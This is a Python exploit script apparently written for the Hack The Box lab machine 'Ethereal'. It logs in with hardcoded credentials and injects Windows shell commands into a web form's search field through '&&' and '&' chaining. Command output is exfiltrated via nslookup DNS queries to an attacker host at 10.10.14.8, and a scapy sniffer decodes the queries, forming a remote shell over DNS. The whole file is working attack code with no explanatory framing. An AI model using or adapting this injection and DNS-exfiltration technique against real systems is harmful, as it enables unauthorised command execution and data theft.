from scapy.all import *
from threading import Thread
from time import sleep
from cmd import Cmd
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup


class Terminal(Cmd):
    prompt = '> '

    def __init__(self):
        self.auth = HTTPBasicAuth('alan', '!C414m17y57r1k3s4g41n!')
        page = requests.get('http://ethereal.htb:8080', auth=self.auth)
        soup = BeautifulSoup(page.text, 'html.parser')
        self.VS = soup.find('input', {'name': '__VIEWSTATE'})['value']
        self.VSG = soup.find('input', {'name': '__VIEWSTATEGENERATOR'})['value']
        self.EV = soup.find('input', {'name': '__EVENTVALIDATION'})['value']
        self.CTL = soup.find('input', {'name': 'ctl02'})['value']
        Cmd.__init__(self)

    def do_cmd(self, args):
        cmd = f"""-n 1 127.0.0.1 && start cmd /c "{args}" """
        self.post(cmd)
        print(args)

    def default(self, args):
        cmd = f"""-n 1 127.0.0.1 & for /f "tokens=1-26" %a in ('cmd /c "{args}"') do nslookup Q%aZ.Q%bZ.Q%cZ.Q%dZ.Q%eZ.Q%fZ.Q%gZ.Q%hZ.Q%iZ.Q%jZ.Q%kZ.Q%lZ.Q%mZ.Q%nZ.Q%oZ.Q%pZ.Q%qZ.Q%rZ.Q%sZ.Q%tZ.Q%uZ.Q%vZ.Q%wZ.Q%xZ.Q%yZ.Q%zZ. 10.10.14.8"""
        self.post(cmd)
    
    def post(self, cmd):
        data = {
            '__VIEWSTATE': self.VS,
            '__VIEWSTATEGENERATOR': self.VSG,
            '__EVENTVALIDATION': self.EV,
            'search': cmd,
            'ctl02': self.CTL,
        }
        proxies = {
            'http': 'http://localhost:9080',
        }
        requests.post('http://ethereal.htb:8080', data=data, auth=self.auth, proxies=proxies)

class Sniffer(Thread):
    def __init__(self, interface="tun0"):
        super().__init__()
        self.interface = interface

    def run(self):
        sniff(iface=self.interface, filter="ip", prn=self.print_packet)

    def print_packet(self, packet):
        if packet.haslayer(DNS):
            if packet.dport == 53:
                qname = packet.qd.qname.decode("utf-8")
                qtype = packet.qd.qtype
                if qtype == 1:
                    print(qname[1:-2].replace("Z.Q", " ").strip())


sniffer = Sniffer()
sniffer.start()
terminal = Terminal()
terminal.cmdloop()